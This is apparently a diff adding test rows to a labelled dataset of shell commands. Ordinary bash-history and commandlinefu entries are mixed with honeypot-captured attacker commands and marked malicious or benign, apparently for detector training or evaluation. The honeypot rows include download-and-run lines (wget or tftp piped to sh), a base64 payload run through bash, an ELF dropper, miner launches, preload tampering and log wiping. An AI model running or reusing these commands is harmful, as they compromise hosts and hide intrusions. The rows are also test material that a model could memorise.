+d2_003689,"gst-launch-0.10 autovideosrc ! video/x-raw-yuv,framerate=\(fraction\)30/1,width=640,height=480 ! ffmpegcolorspace ! autovideosink",0,commandlinefu,test
+d2_003690,mkdir testfolder,0,bash_history,test
+d2_003695,"for i in ""/bin"" ""/home"" ""/root"" ""/tmp"" ""/usr"" ""/etc""",1,honeypot,test
+d2_003698,screen -r proxy,0,bash_history,test
+d2_003700,ln -nsf <TARGET> <LINK>,0,commandlinefu,test
+d2_003708,"find /directory/to/search/ -type f -print0 | xargs -0 grep ""findtext""",0,commandlinefu,test
+d2_003712,chmod 777 sh,1,honeypot,test
+d2_003716,ls/,0,bash_history,test
+d2_003718,tar zxvf segher3.tgz,0,bash_history,test
+d2_003721,perl .a.txt,0,bash_history,test
+d2_003724,./kyahdn2L,1,honeypot,test
+d2_003726,mkdir .chef,0,bash_history,test
+d2_003728,"echo ""admin"" | sh -c ""sed '#/lib/libxml.so#d' /etc/ld.so.preload > /etc/ld.so.preload""",1,honeypot,test
+d2_003734,-mv juegos_de_dados juegos_de_dados.rb,0,bash_history,test
+d2_003738,mencoder -forceidx -ovc copy -oac copy -o output.avi video1.avi video2.avi,0,commandlinefu,test
+d2_003753,wget -O - -q http://h0180f604.example.net/imgtemplate/online.php | sh,1,honeypot,test
+d2_003754,egrep,0,bash_history,test
+d2_003759,zhs,0,bash_history,test
+d2_003767,tftp -g 27.149.179.207 -r tftp.sh,1,honeypot,test
+d2_003769,scp -C 56.181.59.25:/tmp/backup.sql /path/to/backup.sql,0,commandlinefu,test
+d2_003775,wget http://hdedcf99e.example.net/eBxUk/kjUiwa.sh,1,honeypot,test
+d2_003779,chmod 777 Razor2.sh,1,honeypot,test
+d2_003782,nano Controllers/setControlValue.php,0,bash_history,test
+d2_003793,ls mydata/vim/,0,bash_history,test
+d2_003800,nohup tcpdump -v tcp port 20004 &,0,bash_history,test
+d2_003807,ip route list,0,bash_history,test
+d2_003814,mkdir git_test,0,bash_history,test
+d2_003815,git clones.git powerline-fonts,0,bash_history,test
+d2_003822,rm freeanon.c,0,bash_history,test
+d2_003834,./home/admin/v.py,1,honeypot,test
+d2_003836,emacs bash/school,0,bash_history,test
+d2_003837,./Muw3fuvA,1,honeypot,test
+d2_003838,ls -ltr 120706_SSprimaryhepmicroRNA_00092_Evita/Data/reports/p,0,bash_history,test
+d2_003850,git commit -A,0,bash_history,test
+d2_003857,vim EbenLink/1st_person_Thief.txt,0,bash_history,test
+d2_003858,less addshared.sh,0,bash_history,test
+d2_003873,ls -drt /var/log/* | tail -n5 | xargs sudo tail -n0 -f,0,commandlinefu,test
+d2_003881,tftp 100.109.142.127 -c get tftp1.sh,1,honeypot,test
+d2_003882,./4B2nM25h,1,honeypot,test
+d2_003884,mkdir mmus,0,bash_history,test
+d2_003898,sudo pkill deluged,0,bash_history,test
+d2_003902,m (\033[1,1,honeypot,test
+d2_003906,./loligang.ppc loligang.ppc,1,honeypot,test
+d2_003909,wget http://h76a2acd4.example.net/Linux-syn25000,1,honeypot,test
+d2_003911,grep og kp.text,0,bash_history,test
+d2_003926,scp student6@ansiblelab.intervebc.com:~/storagegrid/foo.py .,0,bash_history,test
+d2_003930,vim Packages,0,bash_history,test
+d2_003931,vim fork.c,0,bash_history,test
+d2_003932,touch testCreateFile,0,bash_history,test
+d2_003936,ftpget -v -u anonymous -p anonymous -P 21 214.195.254.24 ftp1.sh ftp1.sh,1,honeypot,test
+d2_003946,ls server/,0,bash_history,test
+d2_003947,rm -rf bios,1,honeypot,test
+d2_003948,LC_ALL=C /dev/shm/l6p08mqb8l2a3kb78jl5tyhkhg,1,honeypot,test
+d2_003950,cp -R toremove hello3,0,bash_history,test
+d2_003955,git config --global user.email micaaela.chavez2909@gmail.com,0,bash_history,test
+d2_003957,echo -e '\x41\x4b\x34\x37'cd /tmp,1,honeypot,test
+d2_003958,tar xvf cracklib-2.9.6.tar.gz,0,bash_history,test
+d2_003959,sudo vi /boot/cmdline.txt,0,bash_history,test
+d2_003973,docker rm -f $(docker ps -a -q),0,bash_history,test
+d2_003981,sudo smbpasswd -a pi,0,bash_history,test
+d2_003986,tail 30 access.log,0,bash_history,test
+d2_003988,lsof -i -n | grep ESTABLISHED,0,commandlinefu,test
+d2_003989,find / -name powerline 2>/dev/null,0,bash_history,test
+d2_003993,bash -c ./zgjAFUJJ,1,honeypot,test
+d2_004002,time --help,0,bash_history,test
+d2_004008,rm config.inc,0,bash_history,test
+d2_004009,"ufw app info ""Apache Full""",0,bash_history,test
+d2_004011,view main.go,0,bash_history,test
+d2_004015,rm wc,0,bash_history,test
+d2_004018,"ln -sn Stranger\ Things/Season\ 2/ ""Stranger Things 2""",0,bash_history,test
+d2_004023,netstat -tp,0,bash_history,test
+d2_004028,"ps aux | awk '{print $2, $4, $11}' | sort -k2rn | head -n 10",0,commandlinefu,test
+d2_004032,bash function.sh,0,bash_history,test
+d2_004037,alias counts=sort | uniq -c | sort -nr,0,commandlinefu,test
+d2_004040,(crontab -l; echo '* * * * * dmesg -c'; ) | crontab -,0,commandlinefu,test
+d2_004042,sort -n kp.txt,0,bash_history,test
+d2_004043,find ./* -ctime -1 | xargs ls -ltr --color,0,commandlinefu,test
+d2_004044,cd /var/tm p,1,honeypot,test
+d2_004045,./miori.x86,1,honeypot,test
+d2_004051,daemon -r -b tglog.txt -- /home/pi/tg/telegram -s /home/pi/tg/test.lua -k /home/pi/tg/tg-server.pub,0,bash_history,test
+d2_004054,ls /usr/local/php5/etc,0,bash_history,test
+d2_004060,cd .Nasa,1,honeypot,test
+d2_004063,cp -rf ./tmp/ ../,0,bash_history,test
+d2_004065,vim -P ~/.ncmpcpp/config,0,bash_history,test
+d2_004071,ssh 212.214.98.182:4200,0,bash_history,test
+d2_004075,perl Virus.pl,1,honeypot,test
+d2_004076,tar xvf doo,1,honeypot,test
+d2_004080,bash -c ./phOecEGM,1,honeypot,test
+d2_004084,dd if=/dev/dsp | ssh -c arcfour -C username@host dd of=/dev/dsp,0,commandlinefu,test
+d2_004088,sudo iptables -L TRAFFIC_OUT -n -v -x,0,bash_history,test
+d2_004097,make --Wfatal-errors,0,bash_history,test
+d2_004100,yaourt trading,0,bash_history,test
+d2_004107,chmod +x hcDwqCAU,1,honeypot,test
+d2_004114,"palindrome?(""ara"")",0,bash_history,test
+d2_004116,perl Florin.sh,1,honeypot,test
+d2_004122,"echo ""IyEvYmluL2Jhc2gKcm0gLXJmIC9kZXYvc2htLy5yc3luYyoKcm0gLXJmIC9kZXYvc2htL2RvdGEqCnJtIC1yZiAvdG1wLy5yc3luYyoKcm0gLXJmIC90bXAvZG90YSoKcm0gLXJmIC92YXIvdG1wLy5yc3luYyoKcm0gLXJmIC92YXIvdG1wL2RvdGEqCnJtIC1yZiAvdG1wLy5YMTktdW5peApybSAtcmYgL3RtcC8uWDE3LXVuaXgKcm0gLXJmIC90bXAvLnRzCnJtIC1yZiAvdmFyL3RtcC8uIiAgICAgIi8qCnJtIC1yZiAvdG1wLy50eApybSAtcmYgL3RtcC8ueG0Kcm0gLXJmIC90bXAvLnp4CnJtIC1yZiAvdmFyL3RtcC8uIiAgICAgIi8ueCoKcm0gLXJmIC90bXAvLnpldSoKcm0gLXJmIC92YXIvdG1wLy56ZXUqCnJtIC1yZiAvZGV2L3NobS8uemV1KgoKcHMgLWF1eHd3dyB8IGdyZXAgLWkgc2V0dDY0ICB8IGdyZXAgLWl2IGdyZXAKaWYgWyAkPyAtZXEgMCBdCnRoZW4KY3JvbnRhYiAtcgpraWxsIC05IGBwcyAtYXV4d3d3IHwgZ3JlcCB0dHkgfCBncmVwIC1pdiBncmVwIHwgYXdrICd7cHJpbnQgJDJ9J2AKa2lsbCAtOSBgcHMgLWF1eHd3dyB8IGdyZXAgdHR5MSB8IGdyZXAgLWl2IGdyZXAgfCBhd2sgJ3twcmludCAkMn0nYApraWxsIC05IGBwcyAtYXV4d3d3IHwgZ3JlcCBiaW9zZXQgfCBncmVwIC1pdiBncmVwIHwgYXdrICd7cHJpbnQgJDJ9J2AKa2lsbCAtOSBgcHMgLWF1eHd3dyB8IGdyZXAgbHZtZXRhZCB8IGdyZXAgLWl2IGdyZXAgfCBhd2sgJ3twcmludCAkMn0nYApybSAtcmYgL3Zhci90bXAvLiIgICAgICIvKgpybSAtcmYgL3RtcC8udHgKcm0gLXJmIC90bXAvLnhtCnJtIC1yZiAvdG1wLy56eApybSAtcmYgL3Zhci90bXAvLiIgICAgICIvLngqCmVsc2UKZWNobwpmaQoKcHMgLWF1eHd3dyB8IGdyZXAgLWkgc2V0bTY0ICB8IGdyZXAgLWl2IGdyZXAKaWYgWyAkPyAtZXEgMCBdCnRoZW4KY3JvbnRhYiAtcgpraWxsIC05IGBwcyAtYXV4d3d3IHwgZ3JlcCB0dHkgfCBncmVwIC1pdiBncmVwIHwgYXdrICd7cHJpbnQgJDJ9J2AKa2lsbCAtOSBgcHMgLWF1eHd3dyB8IGdyZXAgdHR5MSB8IGdyZXAgLWl2IGdyZXAgfCBhd2sgJ3twcmludCAkMn0nYApraWxsIC05IGBwcyAtYXV4d3d3IHwgZ3JlcCBiaW9zZXQgfCBncmVwIC1pdiBncmVwIHwgYXdrICd7cHJpbnQgJDJ9J2AKa2lsbCAtOSBgcHMgLWF1eHd3dyB8IGdyZXAgbHZtZXRhZCB8IGdyZXAgLWl2IGdyZXAgfCBhd2sgJ3twcmludCAkMn0nYApybSAtcmYgL3Zhci90bXAvLiIgICAgICIvKgpybSAtcmYgL3RtcC8udHgKcm0gLXJmIC90bXAvLnRzCnJtIC1yZiAvdG1wLy54bQpybSAtcmYgL3RtcC8uengKcm0gLXJmIC92YXIvdG1wLy4iICAgICAiLy54KgplbHNlCmVjaG8KZmkKCmtpbGwgLTkgYHBzIC1hdXh3d3cgfCBncmVwIGxkLWxpbnV4LXg4Ni02NCB8IGdyZXAgLWl2IGdyZXAgfCBhd2sgJ3twcmludCAkMn0nYApraWxsIC05IGBwcyAtYXV4d3d3IHwgZ3JlcCBnbyB8IGdyZXAgLWl2IGdyZXAgfCBhd2sgJ3twcmludCAkMn0nYApraWxsIC05IGBwcyAtYXV4d3d3IHwgZ3JlcCB0c20gfCBncmVwIC1pdiBncmVwIHwgYXdrICd7cHJpbnQgJDJ9J2AKa2lsbCAtOSBgcHMgLWF1eHd3dyB8IGdyZXAgYmlvc2V0IHwgZ3JlcCAtaXYgZ3JlcCB8IGF3ayAne3ByaW50ICQyfSdgCmtpbGwgLTkgYHBzIC1hdXh3d3cgfCBncmVwIGx2bWV0YWQgfCBncmVwIC1pdiBncmVwIHwgYXdrICd7cHJpbnQgJDJ9J2AKcGtpbGwgLTkgZ28KcGtpbGwgLTkgdHNtCg=="" | base64 --decode | bash >> /dev/null 2>1&",1,honeypot,test
+d2_004124,vi ifcfg-eth0,0,bash_history,test
+d2_004125,python3 get-pip.py,0,bash_history,test
+d2_004133,vim dungeon.c,0,bash_history,test
+d2_004137,mkdir identity-router,0,bash_history,test
+d2_004139,nvm install 8,0,bash_history,test
+d2_004144,./b80PbZIX,1,honeypot,test
+d2_004165,mdel b:su.*,0,bash_history,test
+d2_004169,diff dist.female.first dist.male.first,0,bash_history,test
+d2_004176,git clone sumitkumari/test1,0,bash_history,test
+d2_004183,makefile phone.c,0,bash_history,test
+d2_004188,dnf install -y flatpak,0,bash_history,test
+d2_004190,rm -rf psybnc-linuxRO.tar,1,honeypot,test
+d2_004192,"sed /BEGIN/,/END/s/xxx/yyy/g input.txt",0,commandlinefu,test
+d2_004204,/home/pi/tg/bin/telegram-cli -k /home/pi/tg/tg-server.pub -W -e 'msg Partyzone! /deurbel!',0,bash_history,test
+d2_004216,mkdir $HOME/bin,0,bash_history,test
+d2_004218,[[ -d dir ]] || mkdir dir ; cd dir,0,commandlinefu,test
+d2_004222,cat caso2,0,bash_history,test
+d2_004227,find . -depth -print -execdir rename -f 'y/A-Z/a-z/' '{}' \;,0,commandlinefu,test
+d2_004228,./xmrig,1,honeypot,test
+d2_004242,$ num 7,0,bash_history,test
+d2_004245,rm -rf l_*,0,bash_history,test
+d2_004253,less /usr/share/doc/packages/x2goserver,0,bash_history,test
+d2_004256,mysql -u bjohnston -p -h localhost,0,bash_history,test
+d2_004264,conda install django,0,bash_history,test
+d2_004270,"echo ""zeroshell"" | sudo -S sh -c ""sed '#/lib/libxml.so#d' /etc/ld.so.preload > /etc/ld.so.preload""",1,honeypot,test
+d2_004279,youdao-dict,0,bash_history,test
+d2_004283,sudo cd /home/air/wgb/standalone,0,bash_history,test
+d2_004284,git reset --mixed HEAD,0,bash_history,test
+d2_004292,echo 'fOo BaR' | tr '[A-Z]' '[a-z]' | sed 's/\(^\| \)\([a-z]\)/\1\u\2/g',0,commandlinefu,test
+d2_004293,ls bower_components/jquery-easing/,0,bash_history,test
+d2_004302,seq -f %06g 10,0,bash_history,test
+d2_004306,parted /dev/sda print,0,commandlinefu,test
+d2_004310,grep -m 1 'bogomips' /proc/cpuinfo | cut -d: -f2,1,honeypot,test
+d2_004314,sudo service mongodb start,0,bash_history,test
+d2_004316,exfatfsck -l,0,bash_history,test
+d2_004319,"echo $(uname -snmpr | tr ""\n"" "" """,1,honeypot,test
+d2_004323,function man2pdf(){ man -t ${1:?Specify man as arg} | open -f -a preview; },0,commandlinefu,test
+d2_004325,./sadskhwes2,1,honeypot,test
+d2_004329,touch abcd.txt,0,bash_history,test
+d2_004330,find . -type d -exec du -sk '{}' \; | awk '($1 < 2048) {print $2}',0,commandlinefu,test
+d2_004336,"if [[ ""$1"" =~ ^[0-9]+$ ]]; then echo ""Is a number""; fi",0,commandlinefu,test
+d2_004340,pacman -S bitcoin,0,bash_history,test
+d2_004341,"smbclient --user=user%password --directory ""<subdirectory>"" --command ""put <file>"" //<server>/<share-name>",0,commandlinefu,test
+d2_004343,cfce4-terminal&,0,bash_history,test
+d2_004345,find . -type d \( -name DIR1 -o -name DIR2 \) -prune -o -type f -print0 | xargs -r0 md5sum,0,commandlinefu,test
+d2_004346,ln -sn /media/bjohnston/Acer/Users/bjohnston/Music/ dir,0,bash_history,test
+d2_004347,vi /etc/modules,0,bash_history,test
+d2_004353,"sed i""+"" file.txt | xargs echo 0 |bc",0,commandlinefu,test
+d2_004359,wc -l dist.*,0,bash_history,test
+d2_004374,"ifconfig eth0 | grep ""inet "" | cut -d ':' -f2 | awk '{print $1}'",0,commandlinefu,test
+d2_004380,"echo ""[+] Processor: ""[`uname -m`]"" ID:[`id -u`]""",1,honeypot,test
+d2_004385,man ls | col -b > ~/Desktop/man_ls.txt,0,commandlinefu,test
+d2_004392,find . -type d -exec mkdir /copy_location/{} \;,0,commandlinefu,test
+d2_004400,das,1,honeypot,test
+d2_004405,more cstoretest.yaml,0,bash_history,test
+d2_004412,chmod +x MxsCueHP,1,honeypot,test
+d2_004420,unzip daa,1,honeypot,test
+d2_004425,HelloJar.jar,0,bash_history,test
+d2_004434,tftp -r zatoempire2.sh -g 0x099as0xd.duckdns.org,1,honeypot,test
+d2_004440,grep prim a,0,bash_history,test
+d2_004441,xprop,0,bash_history,test
+d2_004448,cd /dev/netslink/,1,honeypot,test
+d2_004459,service smb restart,0,bash_history,test
+d2_004462,"SIZE=`fdisk -s /dev/sdx`; dd if=/dev/sdx bs=1M | pv -s ""$SIZE""k > hdd.img",0,commandlinefu,test
+d2_004470,xterm -display :12.0 -e ssh -X user@server &,0,commandlinefu,test
+d2_004471,"cat /dev/urandom | hexdump -C | grep ""ca fe""",0,commandlinefu,test
+d2_004473,TZ=Indian/Maldives date,0,commandlinefu,test
+d2_004480,"find . -name ""*.gz"" |xargs du -sch",0,bash_history,test
+d2_004482,vi unix4.users,0,bash_history,test
+d2_004488,sudo apt-get install apache2 php5-mysql libapache2-mod-php5,0,bash_history,test
+d2_004501,echo $(shuf -n4 /usr/share/dict/words),0,commandlinefu,test
+d2_004510,touch aaa,0,bash_history,test
+d2_004518,pip install kernmagic,0,bash_history,test
+d2_004527,brew update && brew upgrade `brew outdated`,0,commandlinefu,test
+d2_004528,dd if=/dev/zero of=testfile.seek seek=5242879 bs=1 count=1,0,commandlinefu,test
+d2_004529,open thesis.pdf,0,bash_history,test
+d2_004534,cat dickens.txt | tr -sc 'A-Za-z' '\12' | tr -d [:punct:] | tr [:upper:] [:lower:],0,bash_history,test
+d2_004538,chmod +x script1234.sh,0,bash_history,test
+d2_004543,./MhTZSuBh,1,honeypot,test
+d2_004547,sudo nano /edx/var/log/lm,0,bash_history,test
+d2_004549,sudo apt -get install git,0,bash_history,test
+d2_004555,more selftypeparameterposition.test,0,bash_history,test
+d2_004556,wget http://hb496ca7e.example.net/SnOoPy.sh,1,honeypot,test
+d2_004558,wget http://h7bb22070.example.net/backuper.sh,1,honeypot,test
+d2_004560,establishing a connection with a HTTP/HTTPS request,1,honeypot,test
+d2_004569,"netstat -anl | grep :80 | awk '{print $5}' | cut -d "":"" -f 1 | uniq -c | sort -n | grep -c IPHERE",0,commandlinefu,test
+d2_004577,netstat -an |grep 53,0,bash_history,test
+d2_004583,wget http://hc4b991ac.example.net/unixcod.tar.gz,1,honeypot,test
+d2_004590,screenfetch --help,0,bash_history,test
+d2_004592,pip install --upgrade flask-sqlalchemy,0,bash_history,test
+d2_004593,perl lynx.txt 10.96.139.83,1,honeypot,test
+d2_004595,mysqldump -uUSERNAME -pPASSWORD database | gzip > /path/to/db/files/db-backup-`date +%Y-%m-%d`.sql.gz ;find /path/to/db/files/* -mtime +5 -exec rm {} \;,0,commandlinefu,test
+d2_004599,nano syscoin.conf,0,bash_history,test
+d2_004608,echo $(($(tr '\n' '+')0)),0,commandlinefu,test
+d2_004610,wget https://hcbde1f0b.example.net/oxUcl/xmrig,1,honeypot,test
+d2_004615,path marques,0,bash_history,test
+d2_004616,kill `pidof telnetd`,0,bash_history,test
+d2_004623,cp ls.sh myls.sh,0,bash_history,test
+d2_004626,git add listfile.go,0,bash_history,test
+d2_004628,cat .ssh/authorized_keys | grep -v 'heVAZUWSKHausOwb+Rem+eKhkrKvoeteqJXEIrlLbHyRHn+12nN/qgG5kIcICv4TRD59GHMYZH3ILngyFJQ==' >>.ssh/.auth_k,1,honeypot,test
+d2_004629,"curl -s https://h2fe9a651.example.net/documentation/en-US/Red_Hat_Enterprise_Linux/ | grep -o '[^""]*Linux/7/pdf[^""]*' | xargs -I{} wget https://hd11bc052.example.net",0,commandlinefu,test
+d2_004631,rm awk,0,bash_history,test
+d2_004632,git .,0,bash_history,test
+d2_004637,scp -t /tmp/bwz529t2sf0lx7thl0zppstmmq,1,honeypot,test
+d2_004639,vim getConfig.py,0,bash_history,test
+d2_004650,defaults write com.apple.finder AppleShowAllFiles true,0,bash_history,test
+d2_004652,cat ~/workspace-eclipse/mesos/pulsar-apache-mesos/componentinfo.xml,0,bash_history,test
+d2_004655,rm header.txt,0,bash_history,test
+d2_004659,rm -rf Tadaa.sh Tadaa.sh Tadaa2.sh Tadaa1.sh,1,honeypot,test
+d2_004662,mv .htaccess .htaccess.bk,0,bash_history,test
+d2_004663,mv Test_Project.war /usr/local/tomcat/apache-tomcat-7.0.72/webapps,0,bash_history,test
+d2_004665,mkdir rsyslog,0,bash_history,test
+d2_004677,sudo systemctl enable bluetooth,0,bash_history,test
+d2_004680,(echo c6bnrTNheEod,1,honeypot,test
+d2_004688,vim primeirp,0,bash_history,test
+d2_004690,ls -ltr /runs/120706_SSprimaryhepmicroRNA_00092_Evita/Data/reports/,0,bash_history,test
+d2_004691,"lsli() { ls -l --color ""$@"" | awk '{ for(i=9;i<NF;i++){ printf(""%s "",$i) } printf(""%s\n"",$NF) }'; }",0,commandlinefu,test
+d2_004697,sudo suo,1,honeypot,test
+d2_004702,/bin/busybox rm -f /proc/fs/.nippon,1,honeypot,test
+d2_004703,sudo service hostname restart,0,bash_history,test
+d2_004705,./cpu.sh,0,bash_history,test
+d2_004712,LC_ALL=C rm -f /dev/shm/dxgd0rj1ossrf9z5iy9rjimwhy,1,honeypot,test
+d2_004716,"grep -i ""aborted login"" /var/log/maillog | awk 'BEGIN{FS=""=""}{print substr($4,8)}' | cut -d"","" -f1",0,commandlinefu,test
+d2_004724,git push -u suresh dev,0,bash_history,test
+d2_004731,vim --help,0,bash_history,test
+d2_004732,ss -o state established '( dport = :http or sport = :https )',0,commandlinefu,test
+d2_004733,./0q22315dqsd NEWROOTS,1,honeypot,test
+d2_004736,.sl,1,honeypot,test
+d2_004742,./flow server:run,0,bash_history,test
+d2_004744,clone,0,bash_history,test
+d2_004761,"ls -ltr ../../100105_Axoset3_PE_Eva/{s_2_1,s_2_2}",0,bash_history,test
+d2_004767,cat tasks/server-rhel.yml,0,bash_history,test
+d2_004769,exec ssh-agent bash,0,bash_history,test
+d2_004787,cat limits.,0,bash_history,test
+d2_004789,wget http://h17af57ca.example.net/arm,1,honeypot,test
+d2_004790,rm dp-tut.tar.bz2,0,bash_history,test
+d2_004791,rm bin,0,bash_history,test
+d2_004797,rm git-demo/,0,bash_history,test
+d2_004804,./bhpU18Wa,1,honeypot,test
+d2_004811,cat both.fa |wc -l,0,bash_history,test
+d2_004812,pandoc -f html -t epub3 -o output.epub input.html,0,commandlinefu,test
+d2_004819,eval $(docker-machine env spotify/kafkaproxy),0,bash_history,test
+d2_004823,uptime | gzip | base64,1,honeypot,test
+d2_004828,tftp -r loligang.x86 -g 100.118.77.54,1,honeypot,test
+d2_004830,kill -s od,1,honeypot,test
+d2_004837,ls -ltr /datadev/homes/mikec/scripts-mikec/python/excelToCSV.py,0,bash_history,test
+d2_004838,wget http://hcf232d41.example.net/read.txt -q,1,honeypot,test
+d2_004839,vim header.txt,0,bash_history,test
+d2_004848,"echo -e """"z,iyd86I""\nIMC0otDRSLel\nIMC0otDRSLel"" | passwd | bash",1,honeypot,test
+d2_004851,perl goddes,1,honeypot,test
+d2_004854,>retrieve,1,honeypot,test
+d2_004863,/bin/busybox chmod 777 jeSjax,1,honeypot,test
+d2_004866,scp -t /tmp/nwlg00hp03jrcl0n7ipfprlnbb,1,honeypot,test
+d2_004868,head ftp_dirs.cfg > msc_sgsn_ftp.cfg,0,bash_history,test
+d2_004869,totem-video-thumbnailer -pg 25 in_video out_png,0,commandlinefu,test
+d2_004872,ls -a.txt,1,honeypot,test
+d2_004873,diff <(jq . -M -S < old.json) <(jq . -M -S < new.json),0,commandlinefu,test
+d2_004890,nano ../Models/Regimen.php,0,bash_history,test
+d2_004906,\s,0,bash_history,test
+d2_004909,mkdir nando,0,bash_history,test
+d2_004918,sudo rm -fr *,0,bash_history,test
+d2_004919,touch /var/run/utmp,1,honeypot,test
+d2_004926,mv mgguanjian-TOHS-typical_tasks_max_distance20-true-config0-local.html mgguanjian-TOHS-typical_tasks_max_distance20-dynamic-config0-local.html,0,bash_history,test
+d2_004928,curl -I -L http://h450d9330.example.net/mQUxL6yS,0,commandlinefu,test
+d2_004929,curl -O http://h7eadc2db.example.net/ssh.sh,1,honeypot,test
+d2_004938,ls al,0,bash_history,test
+d2_004942,"sort -n -t . -k 1,1 -k 2,2 -k 3,3 -k 4,4 /file/of/ip/addresses",0,commandlinefu,test
+d2_004945,"zip -r foo.zip DIR -x ""*/.svn/*""",0,commandlinefu,test
+d2_004950,nano readme.txt,0,bash_history,test
+d2_004958,udevadm monitor,0,commandlinefu,test
+d2_004959,amar,1,honeypot,test
+d2_004963,echo rev abcd,0,bash_history,test
+d2_004979,"echo abcd89efghij340.20kl|grep --color -e ""[0-9]\+"" -e ""$""",0,commandlinefu,test
+d2_004989,goaccess -f /var/log/apache2/access.log -s -b,0,commandlinefu,test
+d2_004990,git daemon --reuseaddr --verbose --export-all --base-path=/parent/of/bare/git/repos,0,commandlinefu,test
+d2_004996,npm install -g grunt,0,bash_history,test
+d2_005028,curl -O ftp://he54b32aa.example.net/hash-x3.tgzcd,1,honeypot,test
+d2_005033,touch $2;firefox -print $1 -printmode PDF -printfile $2,0,commandlinefu,test
+d2_005038,ls -al2C,0,bash_history,test
+d2_005046,iconv -f $(file -bi filename.ext | sed -e 's/.*[ ]charset=//') -t utf8 filename.ext > filename.ext,0,commandlinefu,test
+d2_005053,wine psxe_64,0,bash_history,test
+d2_005055,at-get,1,honeypot,test
+d2_005056,lynx -dump http://he160c1fc.example.net | awk '/http/{print $2}',0,commandlinefu,test
+d2_005063,iptables -D fail2ban-SSH -s <ip_address_to_be_set_free> -j DROP,0,commandlinefu,test
+d2_005065,get -q -O - http://ha1e67547.example.net/2start.jpg | bash -sh,1,honeypot,test
+d2_005066,sh kjUiwa.sh,1,honeypot,test
+d2_005070,gulp stage,0,bash_history,test
+d2_005073,ls /lib/libc-*,0,bash_history,test
+d2_005074,ssh-keygen -R <the_offending_host>,0,commandlinefu,test
+d2_005075,rm -f /lib/init/rw/.nippon,1,honeypot,test
+d2_005076,sudo rm /var/lib/apt/lists/lock,0,bash_history,test
+d2_005084,for c in gcc bison dialog bc asdf; do if ! which $c >/dev/null; then echo Required program $c is missing ; exit 1; fi; done,0,commandlinefu,test
+d2_005093,python3 vpy,1,honeypot,test
+d2_005097,npm i simple-css-tooltips,0,bash_history,test
+d2_005099,ls ~/.vagrant.d/boxes,0,bash_history,test
+d2_005121,sudo systemctl stop bluetooth.service,0,bash_history,test
+d2_005129,mongo -u $MONGODB_USER -p $MONGODB_PASSWORD $MONGODB_DATABASE,0,bash_history,test
+d2_005135,lsof -bw -d cwd -a -c java,0,commandlinefu,test
+d2_005140,./play.sh > play.log,0,bash_history,test
+d2_005153,apt-get install apache2 apache2-utils,0,bash_history,test
+d2_005154,c:\>for %t in (0 1 2 3 4 5 6 7) do for %d in (0 1 2 3 4 5 6 7 8 9) do ping -n 1 machine-0%t%d,0,commandlinefu,test
+d2_005160,rm cheryltoFlat.xlsx,0,bash_history,test
+d2_005167,sudo apt install ksnapshot,0,bash_history,test
+d2_005168,/share/ClusterShare/software/contrib/kevyin/eclipse/eclipse -v,0,bash_history,test
+d2_005172,cat /dev/null > /var/log/secure,1,honeypot,test
+d2_005175,touch 1-saving,0,bash_history,test
+d2_005184,su - ansadmin,0,bash_history,test
+d2_005187,cat app.py,0,bash_history,test
+d2_005189,sudo pacman -Rs rxvt-unicode,0,bash_history,test
+d2_005193,/bin/busybox echo -en '\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x28\x00\x01\x00\x00\x00\x8c\x83\x00\x00\x34\x00\x00\x00\x88\x04\x00\x00\x02\x00\x00\x04\x34\x00\x20\x00\x03\x00\x28\x00\x07\x00\x06\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x80\x00\x00\x38\x04\x00\x00\x38\x04\x00\x00\x05\x00\x00\x00\x00\x80\x00\x00\x01\x00\x00\x00\x38\x04\x00\x00\x38\x04\x01\x00\x38\x04\x01\x00\x0c\x00\x00\x00\x14\x00\x00\x00\x06\x00\x00\x00\x00\x80\x00\x00\x51\xe5\x74\x64\x00\x00\x00\x00\x00\x00\x00\x00' > .dropper,1,honeypot,test
+d2_005195,>/etc/t,1,honeypot,test
+d2_005197,cat hs_err_pid29981.log,0,bash_history,test
+d2_005199,for i in G M K; do du -hx /var/ | grep [0-9]$i | sort -nr -k 1; done | less,0,commandlinefu,test
+d2_005205,/bin/busybox echo -e '\x47\x72\x6f\x70/etc/resolv.conf' > /etc/resolv.conf/.nippon,1,honeypot,test
+d2_005206,vim server_check.py,0,bash_history,test
+d2_005223,/bin/busybox rm -f /proc/irq/.nippon,1,honeypot,test
+d2_005239,./06i9wRXJ,1,honeypot,test
+d2_005251,"ps -eo pcpu,user,pid,cmd | sort -r | head -5",0,commandlinefu,test
+d2_005263,sudo apt-get remove cuda*,0,bash_history,test
+d2_005271,"curl -s http://h8b0517b6.example.net/ | grep -oP '(\d{1,3}\.){3}\d+'",0,commandlinefu,test
+d2_005272,bash install-sh,0,bash_history,test
+d2_005273,javac,0,bash_history,test
+d2_005275,scp -t /var/tmp/12sp3kdwelhwyjybu2y9xt07un,1,honeypot,test
+d2_005293,"stf=$(date +%s.%N);for ((;;));do ctf=$( date +%s.%N );echo -en ""\r$(date -u -d ""0 $ctf sec - $stf sec"" ""+%H:%M:%S.%N"")"";done",0,commandlinefu,test
+d2_005294,lpoption -l,0,bash_history,test
+d2_005297,getent shadow | grep '^[^:]\+:!' | cut -d: -f1,0,commandlinefu,test
+d2_005303,ls -al /proc/<PID>/fd,0,commandlinefu,test
+d2_005314,rosrun auv_debug electronics_interface,0,bash_history,test
+d2_005319,vi ./elpa/archives/melpa,0,bash_history,test
+d2_005322,-rw-rw-r-- 1 terror terror 10746 Jul 22 2016 README.txt,0,bash_history,test
+d2_005328,nvram set http_passwd=root:VivBPucWpUL,1,honeypot,test
+d2_005347,sudo apt purge astrill,0,bash_history,test
+d2_005350,find ../../ -name convertFastqToFastaRight.sh,0,bash_history,test
+d2_005357,vid=$(lspci | grep VGA | cut -f5- -d ' '),1,honeypot,test
+d2_005358,"git config global user.name ""aravind""",0,bash_history,test
+d2_005361,"for device in /sys/bus/pci/devices/*; do echo ""$(basename ${device} | cut -c '6-') $(cut -c '3-6' ${device}/class): $(cut -c '3-' ${device}/vendor):$(cut -c '3-' ${device}/device)""; done",0,commandlinefu,test
+d2_005371,chmod 777 yoyobins.sh,1,honeypot,test
+d2_005376,cd /home/$USER,1,honeypot,test
+d2_005377,wget http://hf631ad94.example.net/n3,1,honeypot,test
+d2_005378,vim -o file1 file2...,0,commandlinefu,test
+d2_005383,wget http://h9ac73aee.example.net/iYY1b/bot.pl,1,honeypot,test
+d2_005411,"awk '{if(NR==1)sub(/^\xef\xbb\xbf/,"""");print}' text.txt > newFile.txt",0,commandlinefu,test
